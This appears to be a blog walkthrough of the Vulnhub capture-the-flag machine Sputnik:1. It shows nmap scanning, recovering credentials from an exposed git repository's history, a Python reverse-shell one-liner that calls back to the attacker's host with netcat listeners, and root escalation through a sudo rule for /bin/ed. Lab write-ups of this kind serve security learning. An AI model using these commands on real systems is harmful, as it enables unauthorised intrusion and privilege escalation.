---
layout: post
title:  "Sputnik:1 Vulnhub Walkthrough"
date:   2020-09-26 15:00:00 +0530
categories: VulnHub CTF
---
Sputnik:1 is a machine in which I used an enumration to get admin credintials from the history of github repo to obtain shell access and then exploited the misconfigured sudo permissions to get root Access.

## Scanning
As always, I started scanning with Nmap

```
root@kali:/home/kali# nmap -sC -sV -p- 192.168.198.141
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-26 08:04 EDT                                                                                           Host is up (0.00067s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE         VERSION
8089/tcp  open  ssl/http        Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2019-03-29T11:03:21
|_Not valid after:  2022-03-28T11:03:21
8191/tcp  open  limnerpressure?
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 200 OK
|     Connection: close
|     Content-Type: text/plain
|     Content-Length: 85
|_    looks like you are trying to access MongoDB over HTTP on the native driver port.
55555/tcp open  http            Apache httpd 2.4.29 ((Ubuntu))
| http-git: 
|   192.168.198.141:55555/.git/
|     Git repository found!
|_    Repository description: Unnamed repository; edit this file 'description' to name the...
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Flappy Bird Game
61337/tcp open  http            Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://192.168.198.141:61337/en-US/account/login?return_to=%2Fen-US%2F
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8191-TCP:V=7.80%I=7%D=9/26%Time=5F6F2E75%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,A9,"HTTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nContent-
SF:Type:\x20text/plain\r\nContent-Length:\x2085\r\n\r\nIt\x20looks\x20like
SF:\x20you\x20are\x20trying\x20to\x20access\x20MongoDB\x20over\x20HTTP\x20
SF:on\x20the\x20native\x20driver\x20port\.\r\n")%r(FourOhFourRequest,A9,"H
SF:TTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nContent-Type:\x20text/
SF:plain\r\nContent-Length:\x2085\r\n\r\nIt\x20looks\x20like\x20you\x20are
SF:\x20trying\x20to\x20access\x20MongoDB\x20over\x20HTTP\x20on\x20the\x20n
SF:ative\x20driver\x20port\.\r\n");
MAC Address: 00:0C:29:D8:32:B0 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.58 seconds

```
Four HTTP Services is up, the 8089 is down, the 8191 has only text, the 55555 has falappy bird game, and the 61337 has splunk enterprise page which requires user and password.
## Git History
I tried SQLmap then bruteforcing the 61337 but it's neither vulerable to SQL Injector nor I got the creds by bruteforcing. the nmap result above shows /.git/ directory so I started reading the files until I got the repo's clone url. 

![Username](/assets/image/004/1.png)

so I cloned it and browsed it's history until I got a secret file contains a credintials. I tried the credintials on the 61337 http service and it worked!

```
root@kali:/home/kali/Desktop/temp# git clone https://github.com/ameerpornillos/flappy.git
Cloning into 'flappy'...
remote: Enumerating objects: 65, done.
remote: Total 65 (delta 0), reused 0 (delta 0), pack-reused 65
Unpacking objects: 100% (65/65), 31.50 KiB | 767.00 KiB/s, done.
root@kali:/home/kali/Desktop/temp# cd flappy/
root@kali:/home/kali/Desktop/temp/flappy# git log --stat
commit 884adf394909a8f5989a163bb666003ea870f582 (HEAD -> master, origin/master, origin/HEAD)
Author: Ameer Pornillos <44928938+ameerpornillos@users.noreply.github.com>
Date:   Fri Mar 29 23:22:06 2019 +0800

    Update new file

 index.html | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

commit d4a672434b93fd156dd61e2b756048501fe0bbc6
Author: Ameer Pornillos <44928938+ameerpornillos@users.noreply.github.com>
Date:   Fri Mar 29 23:21:09 2019 +0800

    Delete new file

 release | 1 -
 1 file changed, 1 deletion(-)

....

commit fdd806897314ed67442fd12c4fc0ccc678dc9857
Author: Ameer Pornillos <44928938+ameerpornillos@users.noreply.github.com>
Date:   Fri Mar 29 23:18:45 2019 +0800

    Delete new file

 secret | Bin 1538 -> 0 bytes
 1 file changed, 0 insertions(+), 0 deletions(-)

commit 5c5d8adcf57267bc0a936a7db21ddb90fcbcd9ca
Author: Ameer Pornillos <44928938+ameerpornillos@users.noreply.github.com>
Date:   Fri Mar 29 23:18:11 2019 +0800
!
root@kali:/home/kali/Desktop/temp/flappy# git checkout 07fda135aae22fa7869b3de9e450ff7cacfbc717
Note: switching to '07fda135aae22fa7869b3de9e450ff7cacfbc717'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -c with the switch command. Example:

  git switch -c <new-branch-name>

Or undo this operation with:

  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

HEAD is now at 07fda13 Commit new file
root@kali:/home/kali/Desktop/temp/flappy# ls
index.html  README.md  secret  sheet.png  sprite.js
root@kali:/home/kali/Desktop/temp/flappy# cat secret 
sputnik:ameer_says_thank_you_and_good_job

```

![Username](/assets/image/004/2.png)

## Basic Shell

I searched for how to get a shell on splunk eterprise and found this amazing article
https://github.com/TBGSecurity/splunk_shells

I followed the Instructions mentioned, but the shell I got is kindda broken so I started another shell

### Target
``` 
root@kali:/home/kali# nc -lvnp 7777
listening on [any] 7777 ...
connect to [192.168.198.137] from (UNKNOWN) [192.168.198.141] 47438
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.198.137",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```

### Hacker
```
root@kali:/home/kali# nc -lvnp 1111
listening on [any] 1111 ...
connect to [192.168.198.137] from (UNKNOWN) [192.168.198.141] 52444
/bin/sh: 0: can't access tty; job control turned off
$ sudo -l
sudo: no tty present and no askpass program specified
$ python -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation 
I ran diffreent Enumeration scripts and found an intersting sudo privilege which allows us to run /bin/ed as root. after searching in the gtfio of how to get a root shell. I ran the following commands.

```
splunk@sputnik:/$ sudo -l
sudo -l
[sudo] password for splunk: ameer_says_thank_you_and_good_job

Matching Defaults entries for splunk on sputnik:                                                                  
    env_reset, mail_badpass,                                                                                      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                      
                                                                                                                  
User splunk may run the following commands on sputnik:                                                            
    (root) /bin/ed                                                                                                
splunk@sputnik:/$ sudo /bin/ed                                                                                    
sudo /bin/ed                                                                                                      
!/bin/sh                                                                                                          
!/bin/sh                                                                                                          
# whoami                                                                                                          
whoami                                                                                                            
root                                                                                                              
# cd ~                                                                                                            
cd ~                                                                                                              
# ls                                                                                                              
ls                                                                                                                
flag.txt                                                                                                          
# cat flag.txt
cat flag.txt
 _________________________________________
/ Congratulations!                        \
|                                         |
| You did it!                             |
|                                         |
| Thank you for trying out this challenge |
| and hope that you learn a thing or two. |
|                                         |
| Check the flag below.                   |
|                                         |
| flag_is{w1th_gr34t_p0w3r_c0m35_w1th_gr3 |
| 4t_r3sp0ns1b1l1ty}                      |
|                                         |
| Hope you enjoy solving this challenge.  |
| :D                                      |
|                                         |
\ - ameer (from hackstreetboys)           /
 -----------------------------------------
      \                    / \  //\
       \    |\___/|      /   \//  \\
            /0  0  \__  /    //  | \ \    
           /     /  \/_/    //   |  \  \  
           @_^_@'/   \/_   //    |   \   \ 
           //_^_/     \/_ //     |    \    \
        ( //) |        \///      |     \     \
      ( / /) _|_ /   )  //       |      \     _\
    ( // /) '/,_ _ _/  ( ; -.    |    _ _\.-~        .-~~~^-.
  (( / / )) ,-{        _      `-.|.-~-.           .~         `.
 (( // / ))  '/\      /                 ~-. _ .-~      .-~^-.  \
 (( /// ))      `.   {            }                   /      \  \
  (( / ))     .----~-.\        \-'                 .~         \  `. \^-.
             ///.----..>        \             _ -~             `.  ^-`  ^-_
               ///-._ _ _ _ _ _ _}^ - - - - ~                     ~-- ,.-~
                                                                  /.-~

```

and voila here is the root privilege!







